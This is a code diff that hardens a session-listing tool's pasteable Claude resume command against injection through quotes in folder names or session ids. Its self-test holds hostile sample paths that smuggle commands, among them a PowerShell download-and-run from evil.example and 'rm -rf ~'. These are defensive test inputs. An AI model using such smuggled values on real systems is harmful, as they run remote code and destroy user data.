@@ -1012,9 +1012,22 @@ def _build(path, slug, source, slug_dir=None, branch_hint=None):
         newest = max((f["mtime"] for f in rec["files"]), default=None)
         rec["last_activity"] = newest
     if rec["session_id"] and rec["path"]:
-        # ';' not '&&' - '&&' is a parser error in Windows PowerShell 5.1.
-        rec["resume"] = f"cd '{rec['path']}' ; claude --resume {rec['session_id']}"
+        rec["resume"] = resume_cmd(rec["path"], rec["session_id"])
     return rec
+
+
+# A quote in a folder name would close the quoted path, and whatever followed it
+# would run when the copied command is pasted. PowerShell also reads the curly
+# quotes as quotes. Such a folder gets no Copy resume, not per-shell escaping.
+RESUME_UNSAFE = re.compile("['‘’‚‛\x00-\x1f\x7f]")
+
+
+def resume_cmd(path, session_id):
+    """The pasteable resume command, or None when the path or id could break out of it."""
+    if RESUME_UNSAFE.search(path) or not re.fullmatch(r"[\w-]+", session_id):
+        return None
+    # ';' not '&&' - '&&' is a parser error in Windows PowerShell 5.1.
+    return f"cd '{path}' ; claude --resume {session_id}"
 
 
 def _pretty_slug(slug):
@@ -1727,6 +1740,11 @@ def selftest():
     assert len(mine["waiting"]) == 1
     assert mine["sessions"] == 2 and mine["bytes"] > 0
     assert mine["resume"].count(";") == 1 and "&&" not in mine["resume"], mine["resume"]
+    # A folder named to break out of the quotes gets no command to paste.
+    for evil in ("D:\\x'; iex (iwr evil.example).Content; '", "D:\\x\u2019; calc; \u2018", "/tmp/a'\nrm -rf ~"):
+        assert resume_cmd(evil, "1111") is None, evil
+    assert resume_cmd("D:\\ok", "1111; calc") is None
+    assert resume_cmd("D:\\My Project", "0b1c-22") == "cd 'D:\\My Project' ; claude --resume 0b1c-22"
     assert mine["session_id"] == "1111", mine["session_id"]
 
     gone = got["D--Gone"]
